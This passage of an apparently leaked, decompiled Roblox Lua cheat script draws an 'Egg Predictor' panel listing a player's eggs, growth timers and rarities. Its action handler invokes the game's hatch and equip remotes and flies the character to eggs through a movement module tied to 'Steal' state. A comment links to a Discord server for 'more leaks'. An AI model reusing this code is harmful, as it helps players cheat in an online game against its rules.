		return isShown(result) and result.AbsoluteSize.X > 0
	end

	str39.IsShown = isShown
	local tbl453 = { "Value", "Rarity", "Time Left" }

	local tbl454 = {
		{ Key = "Ready", Title = "READY TO HATCH", Color = str39.Color.Ready },
		{ Key = "Growing", Title = "GROWING", Color = str39.Color.Growing },
		{ Key = "Inventory", Title = "IN INVENTORY", Color = str39.Color.Inventory },
	}

	local n13 = 1
	local paint2 = str39.Paint
	local bold2 = str39.Bold
	local color3 = str39.Color
	local tbl455 = { Sort = tbl453[1], Spotlight = true }
	local id = nil
	local n14 = 0.0909
	local value488 = nil
	local tbl456 = {}
	local tbl457 = {}
	local tbl458 = {}
	local tbl459 = {}
	local n15 = 0
	local n16 = 0
	local n17 = 0.06
	local n18 = -1
	local n19 = -1
	local n20 = -1
	local n21 = 4
	local n22 = 3
	local flag578 = false
	local n23 = 0
	local flag579 = true
	local n24 = 0
	local flag580 = false
	local value489 = nil

	local function requestEggRefresh()
		flag579 = true
	end

	local function func575(flag581)
		if not flag581 or flag581.DiffWrapped then
			return flag581
		end
		local set = flag581.Set
		flag581.DiffWrapped = true

		flag581.Set = function(list64)
			if type(list64) ~= "table" then
				return set(list64)
			end
			local spec = flag581.Spec
			local value490 = nil

			for k, value491 in pairs(list64) do
				if spec[k] ~= value491 then
					value490 = value490 or {}
					value490[k] = value491
				end
			end

			if value490 then
				set(value490)
			end

			return flag581
		end

		return flag581
	end

	local function func576(param301, param302)
		local cleaned3 = string.gsub(tostring(param301.Spec.Text or ""), "%d", "0")
		return tostring(n16) .. "|" .. tostring(param302) .. "|" .. cleaned3
	end

	local function func577(param303, param304)
		local eggRecords = tbl1.EggRecords
		if type(eggRecords) ~= "table" or type(eggRecords.GrowthSecondsRemaining) ~= "function" then
			return 0, 0
		end
		local n25 = 1

		if type(eggRecords.GrowthSpeedMultiplier) == "function" then
			local ok, result = pcall(eggRecords.GrowthSpeedMultiplier, param303)
			ok = ok and type(result) == "number"
			local n26 = 1

			if ok then
				n25 = result
			else
				n25 = n26
			end
		end

		local ok, result = pcall(eggRecords.GrowthSecondsRemaining, param303, param304, n25)
		ok = ok and type(result) == "number"
		local n26 = 0

		if not ok then
			result = n26
		end

		local n27 = 0

		if type(eggRecords.GrowthDuration) == "function" then
			local ok2
			ok2, n27 = pcall(eggRecords.GrowthDuration, param303)
			ok2 = ok2 and type(n27) == "number"
			local n28 = 0

			if not ok2 then
				n27 = n28
			end
		end

		return result, n27
	end

	local function func578(param305)
		local eggRecords = tbl1.EggRecords

		if type(eggRecords) == "table" and type(eggRecords.WeightKg) == "function" then
			local ok, result = pcall(eggRecords.WeightKg, param305)
			if ok and type(result) == "number" then
				return result
			end
		end

		return 0
	end

	local function func579()
		local eggState = tbl1.EggState
		if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
			return nil
		end
		local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
		if not ok or type(result) ~= "table" then
			return nil
		end
		local serverTimeNow = workspace:GetServerTimeNow()
		local tbl460 = {}

		for k, value492 in pairs(result) do
			if type(value492) == "table" then
				local value493 = str39.AssetInfo(value492.AssetCategory)
				local n25 = tonumber(value492.AssetScale) or 0
				local mutations = type(value492.Mutations) == "table" and value492.Mutations or {}

				local tbl461 = {
					Id = k,
					Info = value493,
					Scale = n25,
					Weight = func578(value492),
					Mutations = mutations,
					Income = str39.Income(value493, n25, mutations),
					Status = "Inventory",
					Remaining = math.huge,
					Percent = 0,
				}

				if value492.Placement ~= nil then
					local ok2, result2 = pcall(eggState.IsReadyToHatch, k)

					if ok2 and result2 then
						tbl461.Status = "Ready"
						tbl461.Remaining = 0
						tbl461.Percent = 100
					else
						local num126, num127 = func577(value492, serverTimeNow)
						tbl461.Status = "Growing"
						tbl461.Remaining = num126

						if num127 > 0 then
							tbl461.Percent = math.clamp(math.floor((1 - num126 / num127) * 100), 0, 100)
						end
					end
				end

				table.insert(tbl460, tbl461)
			end
		end

		return tbl460
	end

	local function func580(param306)
		local sort = tbl455.Sort

		table.sort(param306, function(param307, param308)
			if sort == tbl453[2] and param307.Info.RarityNumber ~= param308.Info.RarityNumber then
				return param307.Info.RarityNumber > param308.Info.RarityNumber
			end

			if sort == tbl453[3] and param307.Remaining ~= param308.Remaining then
				return param307.Remaining < param308.Remaining
			end
			return param307.Income > param308.Income
		end)
	end

	local function func581(param309)
		if param309.Status == "Ready" then
			return bold2(paint2(color3.Ready, "Ready to hatch"))
		end

		if param309.Status == "Growing" then
			return bold2(paint2(color3.Clock, str39.FormatClock(param309.Remaining))) .. str39.Separator() .. paint2(color3.Growing, param309.Percent .. "%")
		end
		return paint2(color3.Inventory, "In inventory")
	end

	local function func582(param310)
		local tbl462 = {}
		local flag582 = str39.MutationText(param310.Mutations)
		table.insert(tbl462, bold2(paint2(color3.Income, str39.FormatRate(param310.Income))))
		table.insert(tbl462, paint2(color3.Scale, string.format("%.2fx", param310.Scale)))
		table.insert(tbl462, paint2(color3.Weight, str39.FormatWeight(param310.Weight)))

		if flag582 ~= "" then
			table.insert(tbl462, flag582)
		end

		return table.concat(tbl462, str39.Separator())
	end

	local n25 = 5
	local n26 = n25 + 0.8
	local n27 = 1.2
	local n28 = 1.2
	local n29 = 0.936
	local n30 = 2.3
	local n31 = 0.25
	local n32 = 0.18
	local n33 = n30 + 0.6
	local n34 = 0.24
	local n35 = 0.22

	local function func583(param311)
		if string.upper(tostring(param311.Rarity)) == "SECRET" then
			return str39.SecretGradient
		end
		return param311.Gradient
	end

	local function func584(param312)
		return func583(param312) ~= nil and Color3.fromRGB(255, 255, 255) or param312.Color
	end

	local function func585(param313)
		if string.upper(tostring(param313.Rarity)) == "SECRET" then
			return str39.SecretRotation
		end
		return nil
	end

	local function func586(flag583)
		local flag584 = flag583 and flag583.Get()
		if not flag584 or n16 <= 0 then
			return nil
		end

		if flag584.Text ~= tostring(flag583.Spec.Text or "") then
			return nil
		end
		return flag584
	end

	local function func587(param314)
		local w = func576(param314, "w")
		if param314.WidthKey == w then
			return param314.WidthUnits
		end
		local flag585 = func586(param314)
		if not flag585 then
			return nil
		end
		local size = flag585.Size
		local textWrapped = flag585.TextWrapped
		flag585.TextWrapped = false
		flag585.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
		local x = flag585.TextBounds.X
		flag585.Size = size
		flag585.TextWrapped = textWrapped
		if x <= 0 then
			return nil
		end
		local widthUnits = x / n16
		param314.WidthKey = w
		param314.WidthUnits = widthUnits
		return param314.WidthUnits
	end

	local function func588(param315, num128)
		local num129 = func576(param315, math.floor(num128 * 100 + 0.5))
		if param315.HeightKey == num129 then
			return param315.HeightUnits
		end
		local flag586 = func586(param315)
		if not flag586 then
			return nil
		end
		local size = flag586.Size
		flag586.Size = UDim2.fromOffset(math.max(1, math.floor(num128 * n16 + 0.5)), 100000)
		local y = flag586.TextBounds.Y
		flag586.Size = size
		if y <= 0 then
			return nil
		end
		local heightUnits = y / n16
		param315.HeightKey = num129
		param315.HeightUnits = heightUnits
		return param315.HeightUnits
	end

	local function func589(param316)
		local rfEggWorldAskHatch = networking:FindFirstChild("RF/EggWorld/AskHatch")
		if not rfEggWorldAskHatch or not rfEggWorldAskHatch:IsA("RemoteFunction") then
			return false
		end
		local ok, result = pcall(rfEggWorldAskHatch.InvokeServer, rfEggWorldAskHatch, param316)
		if not ok or result == false then
			return false
		end
		task.wait(0.35)
		local rfEggWorldAskFinishHatch = networking:FindFirstChild("RF/EggWorld/AskFinishHatch")

		if rfEggWorldAskFinishHatch and rfEggWorldAskFinishHatch:IsA("RemoteFunction") then
			pcall(rfEggWorldAskFinishHatch.InvokeServer, rfEggWorldAskFinishHatch, param316)
		end

		return true
	end

	tbl456.RunAction = function()
		local focus = tbl456.Focus
		if type(focus) ~= "table" or focus.Id == nil then
			return
		end
		local id4 = tostring(focus.Id)

		if focus.Status == "Inventory" then
			local eggState = tbl1.EggState
			if type(eggState) == "table" and type(eggState.WearEggTool) == "function" and pcall(eggState.WearEggTool, id4) then
				return
			end
			local rfEggWorldAskWearTool = networking:FindFirstChild("RF/EggWorld/AskWearTool")

			if rfEggWorldAskWearTool and rfEggWorldAskWearTool:IsA("RemoteFunction") then
				pcall(rfEggWorldAskWearTool.InvokeServer, rfEggWorldAskWearTool, id4)
			end

			return
		end

		if focus.Status == "Ready" then
			if not tbl456.Hatching then
				tbl456.Hatching = true
				pcall(func589, id4)
				tbl456.Hatching = false
			end

			return
		end

		if tbl456.Flying or type(str1.FlyTo) ~= "function" then
			return
		end
		local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
		local value494 = nil

		if placedEggRenders then
			for _, child in ipairs(placedEggRenders:GetChildren()) do
				if string.find(child.Name, id4, 1, true) or child:GetAttribute("Uid") == id4 then
					value494 = child
					break
				end
			end
		end

		if not value494 then
			return
		end

		local ok, result = pcall(function()
			return value494:IsA("Model") and value494:GetPivot() or value494.CFrame
		end)

		if not ok then
			return
		end
		local movement = str1.Movement
		if movement.Owner ~= nil and movement.Owner ~= "treadmill" or movement.PlaceWanted or str1.Steal.Active or str1.Steal.Wanted or str1.Steal.Carrying then
			return
		end
		tbl456.Flying = true

		if str1.ClaimMovement("predictor") then
			if str1.Treadmill.Riding or str1.OnBelt() then
				pcall(str1.ExitBelt)
			end

			pcall(str1.FlyTo, result.Position + Vector3.new(0, 3, 0), function()
				return false
			end, "fly")

			str1.ReleaseMovement("predictor")
		end

		tbl456.Flying = false
	end

	local function func590(obj95)
		value488 = obj95
		obj95:SetDock(5, { Gap = n35, DividerColor = Color3.fromRGB(170, 174, 184) })
		local value495 = obj95:Dock()

		tbl456.Icon = obj95:Image({
			Parent = value495,
			X = 0,
			Y = 0,
			Width = n25,
			Height = n25,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.26,
			StrokeThickness = n14,
			StrokeTransparency = 0,
			ZIndex = 8,
		})

		tbl456.Name = obj95:Text({
			Parent = value495,
			X = n26,
			Y = 0,
			Height = n27,
			Scale = n28,
			Wrap = false,
			Gradient = str39.NameGradient,
			TextStrokeTransparency = 1,
			ZIndex = 9,
		})

		tbl456.Rarity = obj95:Text({
			Parent = value495,
			X = n26,
			Y = 0,
			Height = n27,
			Scale = n29,
			Wrap = false,
			Font = str39.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			ZIndex = 9,
		})

		tbl456.Info = obj95:Text({ Parent = value495, X = n26, Y = n27, Height = n25 - n27, Wrap = false, ZIndex = 9 })

		tbl456.Action = obj95:Button({
			Parent = value495,
			X = 0,
			Y = 0,
			Width = 5,
			Height = n27 - 0.1,
			Text = "",
			Scale = 1,
			Background = "#000000",
			BackgroundTransparency = 0.55,
			HoverTransparency = 0.3,
			PressTransparency = 0.15,
			Corner = 0.35,
			StrokeColor = Color3.fromRGB(255, 255, 255),
			StrokeThickness = n14,
			StrokeTransparency = 0.6,
			Visible = false,
			ZIndex = 10,
			Callback = function()
				if type(tbl456.RunAction) == "function" then
					task.spawn(tbl456.RunAction)
				end
			end,
		})

		obj95:OnResize(function(param317, num130, flag587)
			if num130 == n18 and flag587 == n19 then
				return
			end
			n18 = num130
			n19 = flag587
			n15 = num130 / math.max(flag587, 1)
			n16 = flag587
			n23 = 2
			n17 = 0.9 / math.max(obj95:TextSize(), 1)
			tbl456.Rarity.Set({ StrokeThickness = n17 })

			for _, item153 in ipairs(tbl457) do
				item153.Rarity.Set({ StrokeThickness = n17 })
			end
		end)

		for _, item154 in ipairs({ "Icon", "Name", "Rarity", "Info", "Action" }) do
			func575(tbl456[item154])
		end
	end

	local function func591(param318)
		local entry42 = tbl458[param318]

		if not entry42 then
			local value496 = value488:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
			tbl458[param318] = func575(value496)
			entry42 = value496
		end

		return entry42
	end

	local function func592(param319)
		local entry43 = tbl457[param319]
		if entry43 then
			return entry43
		end
		local tbl463 = {}

		tbl463.Frame = value488:Button({
			Name = "Entry",
			Text = "",
			Background = "#000000",
			BackgroundTransparency = 0.74,
			HoverTransparency = 0.46,
			PressTransparency = 0.3,
			Corner = 0.35,
			X = 0,
			Y = 0,
			Width = 1,
			Height = 1,
			Visible = false,
			Callback = function()
				if tbl463.Id ~= nil then
					id = tbl463.Id
					requestEggRefresh()
				end
			end,
		})

		tbl463.Icon = value488:Image({
			Parent = tbl463.Frame,
			X = n31,
			Y = 0,
			Width = n30,
			Height = n30,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.45,
			StrokeThickness = n14,
			StrokeTransparency = 0,
		})

		tbl463.Name = value488:Text({
			Parent = tbl463.Frame,
			X = n31 + n33,
			Y = 0,
			Width = 1,
			Height = n27,
			Scale = n28,
			Wrap = false,
			Gradient = str39.NameGradient,
			TextStrokeTransparency = 1,
		})

		tbl463.Rarity = value488:Text({
			Parent = tbl463.Frame,
			X = n31 + n33,
			Y = 0,
			Width = 1,
			Height = n27,
			Scale = n29,
			Wrap = false,
			Font = str39.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			StrokeThickness = n17,
		})

		tbl463.Detail = value488:Text({
			Parent = tbl463.Frame,
			X = n31 + n33,
			Y = n27,
			Width = math.max(1, n15 - n33 - n31 * 2),
			Height = 1,
			Wrap = true,
		})

		tbl463.Status = value488:Text({ Parent = tbl463.Frame, X = 0, Y = 0, Width = 1, Height = n27, Wrap = false, Align = "Right" })

		for _, item155 in ipairs({ "Frame", "Icon", "Name", "Rarity", "Detail", "Status" }) do
			func575(tbl463[item155])
		end

		tbl457[param319] = tbl463
		return tbl463
	end

	local function func593(list65)
		local tbl464 = { Ready = 0, Growing = 0, Inventory = 0 }
		local n36 = 0
		local value497 = nil

		for _, item156 in ipairs(list65) do
			local status = item156.Status
			tbl464[status] = tbl464[status] + 1
			n36 += item156.Income

			if not value497 or item156.Income > value497.Income then
				value497 = item156
			end
		end

		return bold2(paint2(color3.Text, tostring(#list65) .. " eggs")) .. str39.Separator() .. bold2(paint2(color3.Ready, tbl464.Ready .. " ready")) .. str39.Separator() .. bold2(paint2(color3.Growing, tbl464.Growing .. " growing")) .. str39.Separator() .. bold2(paint2(color3.Inventory, tbl464.Inventory .. " in bag")) .. str39.Separator() .. paint2(color3.Text, "Total") .. " " .. bold2(paint2(color3.Income, str39.FormatRate(n36))), value497
	end

	local function func594(list66, flag588)
		if flag588 == "" then
			return true
		end
		local str52 = " " .. list66.Status
		local lowered5 = string.lower(tostring(list66.Info.Name) .. " " .. tostring(list66.Info.Rarity) .. str52)

		for _, mutation in ipairs(list66.Mutations) do
			lowered5 ..= " " .. string.lower(tostring(mutation))
		end

		return string.find(lowered5, flag588, 1, true) ~= nil
	end

	local function func595(param320)
		local value498 = bold2(paint2(color3.Income, str39.FormatRate(param320.Income)))
		local scale4 = paint2(color3.Scale, string.format("%.2fx", param320.Scale)) .. str39.Separator() .. paint2(color3.Weight, str39.FormatWeight(param320.Weight))
		local tbl465 = { value498, scale4 }

		do
			local values = table.pack(func581(param320))
			table.move(values, 1, values.n, 3, tbl465)
		end

		local flag589 = str39.MutationText(param320.Mutations)
		table.insert(tbl465, flag589 ~= "" and flag589 or paint2(color3.Hint, "Tap an egg below to preview it"))
		return table.concat(tbl465, "\n")
	end

	local function func596(flag590)
		local spotlight = tbl455.Spotlight and flag590 ~= nil

		if value489 ~= spotlight then
			value489 = spotlight
			value488:SetDock(spotlight and 5 or 0, { Gap = n35 })
		end

		tbl456.Icon.Set({ Visible = spotlight })
		tbl456.Name.Set({ Visible = spotlight })
		tbl456.Rarity.Set({ Visible = spotlight })
		tbl456.Info.Set({ Visible = spotlight })
		tbl456.Action.Set({ Visible = spotlight })
		tbl456.Focus = spotlight and flag590 or nil
		if not spotlight then
			return
		end
		local info = flag590.Info

		tbl456.Action.Set({
			Text = flag590.Status == "Inventory" and bold2(paint2(color3.Inventory, "Hold egg")) or flag590.Status == "Ready" and bold2(paint2(color3.Ready, "Hatch egg")) or bold2(paint2(color3.Growing, "Fly to egg")),
		})

		tbl456.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
		tbl456.Name.Set({ Text = str39.Escape(info.Name) })

		tbl456.Rarity.Set({
			Text = string.upper(tostring(info.Rarity)),
			Color = func584(info),
			Gradient = func583(info),
			GradientRotation = func585(info),
		})

		tbl456.Info.Set({ Text = func595(flag590) })
	end

	local function func597(param321, param322)
		local info = param322.Info
		param321.Id = param322.Id
		param321.Frame.Set({ Visible = true, BackgroundTransparency = param322.Id == id and 0.12 or 0.74 })
		param321.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
		param321.Name.Set({ Text = str39.Escape(info.Name) })

		param321.Rarity.Set({
			Text = string.upper(tostring(info.Rarity)),
			Color = func584(info),
			Gradient = func583(info),
			GradientRotation = func585(info),
		})

		param321.Detail.Set({ Text = func582(param322) })
		param321.Status.Set({ Text = func581(param322) })
	end

	local function func598()
		if n15 <= 0 then
			return
		end
		flag578 = false
		local n36 = math.max(1, n15 - n26)
		local action = func587(tbl456.Action)

		if action then
			tbl456.ActionUnits = action + 1.4
		else
			flag578 = true
		end

		local n37 = math.min(tbl456.ActionUnits or 5, n36 * 0.45)
		local n38 = math.max(1, n36 - n37 - n34)
		tbl456.Action.Set({ X = n15 - n37, Y = 0.05, Width = n37, Height = n27 - 0.1 })
		local rarity3 = func587(tbl456.Rarity)

		if rarity3 then
			n22 = rarity3 + 0.1
		else
			flag578 = true
		end

		local name2 = func587(tbl456.Name)

		if name2 then
			n21 = math.min(name2 + 0.1, math.max(1, n38 - n22 - n34))
		else
			flag578 = true
		end

		tbl456.Name.Set({ X = n26, Y = 0, Width = n21, Height = n27 })

		tbl456.Rarity.Set({
			X = n26 + n21 + n34,
			Y = 0,
			Width = math.max(0.5, math.min(n22, n38 - n21 - n34)),
			Height = n27,
		})

		tbl456.Info.Set({ X = n26, Y = n27, Width = n36, Height = math.max(1, n25 - n27) })
		local n39 = math.max(1, n15 - n33 - n31 * 2)
		local n40 = 0

		for _, item157 in ipairs(tbl459) do
			if item157.Kind == "text" then
				local handle = item157.Handle
				local value499 = func588(handle, n15)

				if value499 then
					item157.Height = value499
				else
					flag578 = true
				end

				local n41 = math.max(1, item157.Height or 1)
				handle.Set({ X = 0, Y = n40 + (item157.Gap and 0.5 or 0), Width = n15, Height = n41 })
				n40 += n41 + n35 * 0.5 + (item157.Gap and 0.5 or 0)
			else
				local item = item157.Item
				local detail2 = func588(item.Detail, n39)

				if detail2 then
					item.DetailUnits = detail2
				else
					flag578 = true
				end

				local n41 = math.clamp(item.DetailUnits or 1, 1, 4)
				local status2 = func587(item.Status)

				if status2 then
					item.StatusUnits = status2 + 0.23
				else
					flag578 = true
				end

				local n42 = math.min(n39 * 0.42, math.max(2.73, item.StatusUnits or 2.73))
				local n43 = math.max(1, n39 - n42 - n34)
				local rarity4 = func587(item.Rarity)

				if rarity4 then
					item.RarityUnits = rarity4 + 0.1
				else
					flag578 = true
				end

				local n44 = math.min(item.RarityUnits or 3, n43 * 0.5)
				local name3 = func587(item.Name)

				if name3 then
					item.NameUnits = name3 + 0.1
				else
					flag578 = true
				end

				local min = math.min
				local max = math.max
				local nameUnits = item.NameUnits or 4
				local max2 = math.max
				local n45 = n43 - n44 - n34
				local num131 = min(max(1, nameUnits), max2(1, n45))
				local n46 = n32 * 2
				local n47 = math.max(n41 + n27, 2.3) + n46
				local n48 = (n47 - n41 - n27) / 2
				item.Frame.Set({ X = 0, Y = n40, Width = n15, Height = n47 })
				item.Icon.Set({ Y = (n47 - n30) / 2 })
				item.Name.Set({ X = n31 + n33, Y = n48, Width = num131 })
				item.Rarity.Set({ X = n31 + n33 + num131 + n34, Y = n48, Width = math.max(0.5, n44) })
				item.Detail.Set({ X = n31 + n33, Y = n48 + n27, Width = n39, Height = n41 })

				item.Status.Set({
					Visible = item157.HasStatus,
					X = n31 + n33 + n39 - n42,
					Y = n48,
					Width = math.max(0.5, n42),
				})

				n40 += n47 + n35
			end
		end

		local n41 = math.max(1, n40)

		if math.abs(n41 - n20) > 0.01 then
			n20 = n41
			value488:SetContentLines(n41)
		end
	end

	local function func599()
		if not value488 then
			return
		end
		n23 = 2
		local result94 = func579()
		table.clear(tbl459)
		local n36 = 0

		local function func600(param323, param324)
			n36 += 1
			local value500 = func591(n36)
			value500.Set({ Visible = true, Text = param323 })
			table.insert(tbl459, { Kind = "text", Handle = value500, Gap = param324 })
		end

		local n37

		if not result94 then
			func596(nil)
			func600(bold2(paint2(color3.Hint, "Egg data is not available yet")), false)
			n37 = 0
		else
			func580(result94)
			local value501, value502 = func593(result94)
			func600(value501, false)
			local value503 = nil

			if id ~= nil then
				value503 = nil

				for _, item158 in ipairs(result94) do
					if item158.Id == id then
						value503 = item158
						break
					else
						value503 = nil
					end
				end
			end

			func596(value503 or value502)
			local lowered6 = string.lower(value488:Query())
			local tbl466 = {}

			for _, item159 in ipairs(result94) do
				if func594(item159, lowered6) then
					table.insert(tbl466, item159)
				end
			end

			if #tbl466 == 0 then
				func600(paint2(color3.Hint, #result94 == 0 and "No eggs yet" or string.format("No results for \"%s\"", str39.Escape(lowered6))), false)
				n37 = 0
			else
				n37 = 0

				for _, item160 in ipairs(tbl454) do
					local tbl467 = {}

					for _, item161 in ipairs(tbl466) do
						if item161.Status == item160.Key then
							table.insert(tbl467, item161)
						end
					end

					if #tbl467 > 0 then
						local len3 = #tbl459 > 0
						func600(string.format("<b><font color=\"%s\">%s</font></b> <font color=\"#AAAAAA\">(%d)</font>", item160.Color, item160.Title, #tbl467), len3)

						for _, item162 in ipairs(tbl467) do
							n37 += 1
							local value504 = func592(n37)
							func597(value504, item162)
							table.insert(tbl459, { Kind = "item", Item = value504, HasStatus = true })
						end
					end
				end
			end
		end

		for i = n36 + 1, #tbl458 do
			tbl458[i].Set({ Visible = false })
		end

		for i = n37 + 1, #tbl457 do
			tbl457[i].Frame.Set({ Visible = false })
		end

		func598()
		n23 = 2
	end

	str39.RequestEggRefresh = requestEggRefresh

	if not str39.Ready then
		obj88:CreateText({ Name = "Egg Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		obj88:CreateDropdown({
			Name = "Sort By",
			Options = tbl453,
			Default = tbl453[1],
			Callback = function(sort)
				if table.find(tbl453, sort) then
					tbl455.Sort = sort
					requestEggRefresh()
				end
			end,
		})

		obj88:CreateToggle({
			Name = "Preview Card",
			Default = true,
			Callback = function(value)
				tbl455.Spotlight = value == true
				requestEggRefresh()
			end,
		})

		local obj96 = obj88:CreateCanvas({
			Name = "Egg Predictor",
			Search = true,
			SearchPlaceholder = "Search eggs...",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 32,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(param325)
				func590(param325)
				requestEggRefresh()
			end,
		})

		func4(function()
			obj96:Destroy()
		end)

		local connection = RunService.Heartbeat:Connect(function(deltaTime)
			local flag591 = str39.PageVisible()
			local flag592 = flag591 and (value488 == nil or str39.IsShown(value488:Root()))

			if flag592 and not flag580 then
				flag579 = true
			end

			flag580 = flag592
			if not flag591 then
				return
			end
			n24 += deltaTime

			if flag592 and flag579 or n24 >= n13 then
				n24 = 0

				if flag592 then
					flag579 = false
					pcall(func599)
				end

				if str39.RefreshFuse then
					pcall(str39.RefreshFuse)
				end
			end

			if flag592 and (n23 > 0 or flag578) then
				if n23 > 0 then
					n23 -= 1
				end

				pcall(func598)
			end

			if str39.PlaceFuse then
				str39.PlaceFuse()
			end
		end)

		func4(function()
			connection:Disconnect()
		end)
	end

	paint = str39.Paint
	bold = str39.Bold
	color = str39.Color
	local n36 = 5
	local n37 = n36 + 0.8
	local n38 = 1.2
	local n39 = 1.2
	local n40 = 0.936
	local n41 = 2.3
	local n42 = 0.25
	local n43 = 0.18
	local n44 = n41 + 0.6
	local n45 = 0.24
	n2 = 0.22
	local n46 = 0.0909
	obj80 = nil
	tbl314 = {}
	list51 = {}
	list52 = {}
	list53 = {}
	local n47 = 0
	local n48 = 0
	local n49 = 0.06
	local n50 = -1
	local n51 = -1
	local n52 = -1
	local n53 = 4
	local n54 = 3
	flag500 = false
	n3 = 0

	func459 = function(param326)
		if string.upper(tostring(param326.Rarity)) == "SECRET" then
			return str39.SecretGradient
		end
		return param326.Gradient
	end

	func460 = function(param327)
		return func459(param327) ~= nil and Color3.fromRGB(255, 255, 255) or param327.Color
	end

	func461 = function(param328)
		if string.upper(tostring(param328.Rarity)) == "SECRET" then
			return str39.SecretRotation
		end
		return nil
	end

	func462 = function(obj97)
		obj80 = obj97
		obj97:SetDock(5, { Gap = n2, DividerColor = Color3.fromRGB(170, 174, 184) })
		local value505 = obj97:Dock()

		tbl314.Icon = obj97:Image({
			Parent = value505,
			X = 0,
			Y = 0,
			Width = n36,
			Height = n36,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.26,
			StrokeThickness = n46,
			StrokeTransparency = 0,
			ZIndex = 8,
		})

		tbl314.Name = obj97:Text({
			Parent = value505,
			X = n37,
			Y = 0,
			Height = n38,
			Scale = n39,
			Wrap = false,
			Gradient = str39.NameGradient,
			TextStrokeTransparency = 1,
			ZIndex = 9,
		})

		tbl314.Rarity = obj97:Text({
			Parent = value505,
			X = n37,
			Y = 0,
			Height = n38,
			Scale = n40,
			Wrap = false,
			Font = str39.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			ZIndex = 9,
		})

		tbl314.Info = obj97:Text({ Parent = value505, X = n37, Y = n38, Height = n36 - n38, Wrap = false, ZIndex = 9 })

		obj97:OnResize(function(param329, num132, flag593)
			if num132 == n50 and flag593 == n51 then
				return
			end
			n50 = num132
			n51 = flag593
			n47 = num132 / math.max(flag593, 1)
			n48 = flag593
			n3 = 2
			n49 = 0.9 / math.max(obj97:TextSize(), 1)
			tbl314.Rarity.Set({ StrokeThickness = n49 })

			for _, item163 in ipairs(list51) do
				item163.Rarity.Set({ StrokeThickness = n49 })
			end
		end)
	end

	local function func601(flag594)
		local flag595 = flag594 and flag594.Get()
		if not flag595 or n48 <= 0 then
			return nil
		end

		if flag595.Text ~= tostring(flag594.Spec.Text or "") then
			return nil
		end
		return flag595
	end

	local function func602(param330)
		local flag596 = func601(param330)
		if not flag596 then
			return nil
		end
		local size = flag596.Size
		local textWrapped = flag596.TextWrapped
		flag596.TextWrapped = false
		flag596.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
		local x = flag596.TextBounds.X
		flag596.Size = size
		flag596.TextWrapped = textWrapped
		if x <= 0 then
			return nil
		end
		return x / n48
	end

	local function func603(param331, num133)
		local flag597 = func601(param331)
		if not flag597 then
			return nil
		end
		local size = flag597.Size
		flag597.Size = UDim2.fromOffset(math.max(1, math.floor(num133 * n48 + 0.5)), 100000)
		local y = flag597.TextBounds.Y
		flag597.Size = size
		if y <= 0 then
			return nil
		end
		return y / n48
	end

	func463 = function(param332)
		local entry44 = list52[param332]

		if not entry44 then
			local value506 = obj80:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
			list52[param332] = value506
			entry44 = value506
		end

		return entry44
	end

	func464 = function(param333)
		local entry45 = list51[param333]
		if entry45 then
			return entry45
		end

		local tbl468 = {
			Frame = obj80:Frame({
				Name = "Slot",
				Background = "#000000",
				BackgroundTransparency = 0.74,
				Corner = 0.35,
				X = 0,
				Y = 0,
				Width = 1,
				Height = 1,
				Visible = false,
			}),
		}

		tbl468.Icon = obj80:Image({
			Parent = tbl468.Frame,
			X = n42,
			Y = 0,
			Width = n41,
			Height = n41,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.45,
			StrokeThickness = n46,
			StrokeTransparency = 0,
		})

		tbl468.Name = obj80:Text({
			Parent = tbl468.Frame,
			X = n42 + n44,
			Y = 0,
			Width = 1,
			Height = n38,
			Scale = n39,
			Wrap = false,
			Gradient = str39.NameGradient,
			TextStrokeTransparency = 1,
		})

		tbl468.Rarity = obj80:Text({
			Parent = tbl468.Frame,
			X = n42 + n44,
			Y = 0,
			Width = 1,
			Height = n38,
			Scale = n40,
			Wrap = false,
			Font = str39.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			StrokeThickness = n49,
		})

		tbl468.Detail = obj80:Text({
			Parent = tbl468.Frame,
			X = n42 + n44,
			Y = n38,
			Width = math.max(1, n47 - n44 - n42 * 2),
			Height = 1,
			Wrap = true,
		})

		tbl468.Status = obj80:Text({
			Parent = tbl468.Frame,
			X = 0,
			Y = 0,
			Width = 1,
			Height = n38,
			Wrap = false,
			Align = "Right",
			Color = color.Hint,
		})

		list51[param333] = tbl468
		return tbl468
	end

	func465 = function()
		if n47 <= 0 then
			return
		end
		flag500 = false
		local n55 = math.max(1, n47 - n37)
		local rarity5 = func602(tbl314.Rarity)
		-- more leaks: https://discord.gg/x7YbZeezpm

		if rarity5 then
			n54 = rarity5 + 0.1
		else
			flag500 = true
		end

		local name4 = func602(tbl314.Name)

		if name4 then
			n53 = math.min(name4 + 0.1, math.max(1, n55 - n54 - n45))
		else
			flag500 = true
		end

		tbl314.Name.Set({ X = n37, Y = 0, Width = n53, Height = n38 })

		tbl314.Rarity.Set({
			X = n37 + n53 + n45,
			Y = 0,
			Width = math.max(0.5, math.min(n54, n55 - n53 - n45)),
			Height = n38,
		})

		tbl314.Info.Set({ X = n37, Y = n38, Width = n55, Height = math.max(1, n36 - n38) })
